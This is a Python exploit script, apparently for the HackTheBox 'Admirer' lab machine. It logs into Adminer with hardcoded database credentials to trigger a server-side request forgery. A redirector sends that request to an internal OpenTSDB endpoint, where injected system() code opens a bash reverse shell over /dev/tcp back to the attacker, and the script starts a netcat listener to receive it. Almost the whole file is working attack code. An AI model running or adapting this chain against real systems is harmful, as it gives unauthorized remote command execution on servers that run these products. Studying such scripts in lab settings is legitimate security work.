#!/usr/bin/python3

import requests, sys, signal, argparse, netifaces, subprocess, shlex, os, urllib.parse
from threading import Thread

base_url = "http://db.admirer-gallery.htb/"
burp = {"http" : "http://127.0.0.1:8080"}

def args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", help="Your HackTheBox interface", metavar="tun0", required=True)
	parser.add_argument("-p", "--port", help="Port to be listened on", metavar="80", required=True)
	args = parser.parse_args()
	return args.interface, args.port

def startServer(payload):
	global server
	payload = requests.utils.requote_uri(f"http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:http.stats.web.hits&o=&ylabel=&xrange=10:10&yrange=[33:system(\"{payload}\")]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json")
	server = subprocess.Popen(shlex.split(f"python3 redirector.py -u \"{payload}\""), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def sendPayload(host, port):
	s = requests.session()
	header = {
		"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36"
	}
	r = s.get(base_url, headers=header)
	post_data = {
		"auth[driver]" : "elastic",
		"auth[server]" : host,
		"auth[username]" : "admirer_ro",
		"auth[password]" : "1w4nn4b3adm1r3d2",
		"auth[db]" : "admirer",
		"auth[permanent]" : "1"
	}
	# kwargs para cuando tenemos argumentos del estilo: requests.post(url='https://www.google.com', data=post_data, headers=header)
	t1 = Thread(target=s.post, kwargs={"url" : base_url, "data" : post_data, "headers" : header})
	print("[*] You should now receive the reverse shell")
	t1.daemon = True
	t1.start()
	spawnNetcat(port)

def getAddr(interface):
	return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

def spawnNetcat(port):
	subprocess.run(shlex.split(f"nc -lvnp {port}"))

def makePayload():
	interface, port = args()
	host = getAddr(interface)
	payload = f"%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{host}%2F{port}%200%3E%261%27"
	return payload, host, port

def main():
	payload, host, port = makePayload()
	startServer(payload)
	sendPayload(host, port)

def def_handler(signum, frame):
	try:
		os.kill(server_pid, signal.SIGINT)
	except NameError:
		pass
	print("\n\n[*] Exiting...\n")
	sys.exit()

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	main()
